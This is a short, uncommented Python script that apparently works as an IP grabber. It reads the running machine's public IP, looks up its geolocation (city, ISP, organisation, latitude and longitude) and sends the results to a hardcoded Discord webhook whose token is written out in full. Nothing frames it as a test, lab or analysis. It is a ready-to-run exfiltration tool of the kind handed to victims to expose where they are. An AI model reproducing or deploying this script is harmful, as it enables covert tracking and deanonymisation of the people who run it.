import requests
import json
from dhooks import Webhook, Embed
from datetime import datetime

hook = Webhook("https://discord.com/api/webhooks/1501258166178942986/207eJHjG1D1uNp4dbVw-uPo1UefJnLHx2CBLzaHqokhzaX3bpKL6p7o0N1PZsmwA0hUX")

time = datetime.now().strftime("%H:%M %p")  
ip = requests.get('https://api.ipify.org/').text

r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
geo = r.json()
print(geo)
embed = Embed()                                                                                                                                                            
fields = [
    {'name': 'IP', 'value': geo['query']},
    {'name': 'ipType', 'value': geo['ipType']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'City', 'value': geo['city']},
    {'name': 'Continent', 'value': geo['continent']},
    {'name': 'IPName', 'value': geo['ipName']},
    {'name': 'ISP', 'value': geo['isp']},
    {'name': 'Latitute', 'value': geo['lat']},
    {'name': 'Longitude', 'value': geo['lon']},
    {'name': 'Org', 'value': geo['org']},
    {'name': 'Region', 'value': geo['region']},
    {'name': 'Status', 'value': geo['status']},
]
for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)
hook.send(embed=embed)
